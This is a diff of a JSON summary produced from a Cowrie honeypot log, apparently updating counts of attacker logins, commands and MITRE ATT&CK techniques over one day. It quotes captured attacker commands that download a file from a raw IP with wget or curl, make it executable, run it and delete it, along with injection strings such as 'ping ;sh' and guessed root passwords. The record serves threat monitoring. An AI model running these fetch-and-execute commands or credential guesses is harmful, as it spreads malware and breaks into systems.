@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-21 13:04:37",
+  "generated": "2026-08-21 15:03:45",
   "totals": {
-    "commands": 411,
-    "login_failed": 5163,
-    "login_success": 57,
-    "sessions": 3765
+    "commands": 431,
+    "login_failed": 5788,
+    "login_success": 62,
+    "sessions": 4106
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 5163,
+      "count": 5788,
       "examples": [
         "odoo / P@ssw0rd",
         "sh\\x00 / /bin/busybox UNSTABLE\\x00",
@@ -21,14 +21,14 @@
         "root / root123."
       ],
       "first": "2026-08-21T00:00:05.590428Z",
-      "last": "2026-08-21T13:04:29.586878Z",
-      "unique_ips": 61
+      "last": "2026-08-21T15:03:34.539281Z",
+      "unique_ips": 66
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 128,
+      "count": 129,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -37,14 +37,14 @@
         ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/"
       ],
       "first": "2026-08-21T01:04:57.795191Z",
-      "last": "2026-08-21T12:02:53.397527Z",
-      "unique_ips": 15
+      "last": "2026-08-21T13:22:49.780157Z",
+      "unique_ips": 16
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 72,
+      "count": 74,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -53,14 +53,14 @@
         "http://185.93.89.72/wget"
       ],
       "first": "2026-08-21T01:04:57.795191Z",
-      "last": "2026-08-21T11:37:25.262934Z",
-      "unique_ips": 15
+      "last": "2026-08-21T13:22:50.771504Z",
+      "unique_ips": 16
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 57,
+      "count": 62,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / xirtam",
@@ -69,23 +69,24 @@
         "root / root"
       ],
       "first": "2026-08-21T00:25:45.541215Z",
-      "last": "2026-08-21T13:03:20.459389Z",
-      "unique_ips": 46
+      "last": "2026-08-21T15:01:16.362254Z",
+      "unique_ips": 51
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 10,
+      "count": 12,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "grep processor /proc/cpuinfo|grep -v Duo|wc -l"
       ],
       "first": "2026-08-21T05:12:14.278101Z",
-      "last": "2026-08-21T12:02:53.397527Z",
-      "unique_ips": 9
+      "last": "2026-08-21T14:15:56.446860Z",
+      "unique_ips": 11
     },
     {
       "id": "T1033",
@@ -209,39 +210,39 @@
     ],
     [
       "sh",
-      25
+      27
     ],
     [
       "system",
-      21
+      23
     ],
     [
       "shell",
-      21
+      23
     ],
     [
       "enable",
-      21
+      23
     ],
     [
       "linuxshell",
-      17
+      18
     ],
     [
       "cd /proc && cat self/cmdline",
-      13
-    ],
-    [
-      "ping ;sh",
-      12
+      14
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      12
+      14
+    ],
+    [
+      "ping ;sh",
+      13
     ],
     [
       "enablelinuxshell",
-      11
+      12
     ],
     [
       "busybox",
@@ -256,19 +257,19 @@
       4
     ],
     [
-      "exit",
-      2
-    ],
-    [
       "ping; sh",
-      2
+      3
     ],
     [
       "/bin/busybox STC",
-      2
+      3
     ],
     [
       "/bin/busybox hostname TOASTER",
+      3
+    ],
+    [
+      "exit",
       2
     ],
     [
